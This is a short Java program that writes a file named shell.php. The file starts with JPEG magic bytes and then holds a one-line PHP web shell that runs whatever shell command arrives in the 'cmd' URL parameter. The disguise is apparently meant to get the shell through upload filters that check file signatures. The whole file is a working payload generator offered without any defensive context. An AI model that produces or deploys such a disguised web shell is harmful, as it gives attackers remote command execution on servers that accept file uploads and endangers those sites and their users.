import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;

/**
 * Created by alexk on 12.07.2017.
 */
public class WriteJpegMagicNumber {
    public static void main(String[] args) throws IOException {
        byte[] imageMarker = hexStringToByteArray("FFD8FFE0");
        String shellString = "<? passthru($_GET[\"cmd\"]); ?>";
        try (FileOutputStream writer = new FileOutputStream(getShellFile())) {
            writer.write(imageMarker);
            writer.write(shellString.getBytes());
        }
    }

    private static File getShellFile() throws IOException {
        File shell = new File("shell.php");
        if (!shell.exists()) {
            shell.createNewFile();
        }
        return shell;
    }

    public static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i+1), 16));
        }
        return data;
    }
}
